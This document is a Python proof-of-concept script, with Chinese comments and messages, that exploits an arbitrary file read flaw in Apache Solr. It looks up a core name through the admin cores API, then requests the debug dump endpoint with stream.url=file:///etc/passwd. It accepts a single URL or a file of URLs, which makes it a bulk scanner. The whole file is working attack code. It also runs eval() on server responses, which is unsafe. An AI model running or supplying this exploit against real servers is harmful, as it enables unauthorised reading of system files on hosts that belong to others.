#Apache solr 全版本任意文件读取
import sys
import requests
import urllib3

def solr_url(url1):
    try:
        sess = requests.session()
        req = sess.get(url1,timeout=5,verify=False)
        if req.status_code < 210:
            req = eval(req.text)
            req_list = list(req['status'].keys())
            new_url = url + "solr/" + str(req_list[0]) + poc
            try:
                req = requests.get(new_url,timeout=5,verify=False).text
                if "root" in req:
                    print("[+] " + url + req +"\n存在任意文件读取！")
                else:
                    pass
            except:
                print("连接超时！")
        else:
            print("连接错误！")
    except:
        print("连接超时！")

def solr_urlfile(url2):
    try:
        req = requests.get(url2,timeout=5,verify=False)
        if req.status_code < 210:
            req = eval(req.text)
            req_list = list(req['status'].keys())
            new_url = url2 + "solr/" + str(req_list[0]) + poc
            try:
                req = requests.get(new_url,timeout=5,verify=False).text
                if "root" in req:
                    print("[+] " + url2 + " 存在任意文件读取！")
                else:
                    pass
            except:
                print("连接超时！")
        else:
            print("连接错误！")
    except:
        print("连接超时！")

if __name__ == '__main__':
    payload = 'solr/admin/cores?indexInfo=false&wt=json'
    poc = '/debug/dump?param=ContentStreams&stream.url=file:///etc/passwd'
    try:
        url = sys.argv[1]
        if "http" in url:
            url1 = str(url) + payload
            solr_url(url1)
        else:
            url2 = open(url,'r+')
            for i in url2:
                url2 = i.rstrip('\n') + payload
                solr_urlfile(url2)
    except FileNotFoundError:
        print("找不到该文件！")
    except IndexError:
        print('Apache solr 全版本任意文件读取')
        print('------------------------------------------------------')
        print('使用方式： python poc.py url/urlfile')
        print('------------------------------------------------------')